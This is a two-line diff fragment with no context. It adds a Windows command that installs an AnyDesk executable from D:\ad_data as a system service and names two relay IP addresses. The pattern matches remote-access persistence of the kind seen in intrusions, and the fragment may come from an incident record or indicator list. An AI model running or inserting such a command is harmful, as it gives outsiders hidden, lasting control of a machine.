@@ -1,0 +1,2 @@
+sc create "AnyDesk_D-Drive Service" binpath= D:\ad_data\AnyDesk.exe
+relay 15.235.230.188 141.95.145.210
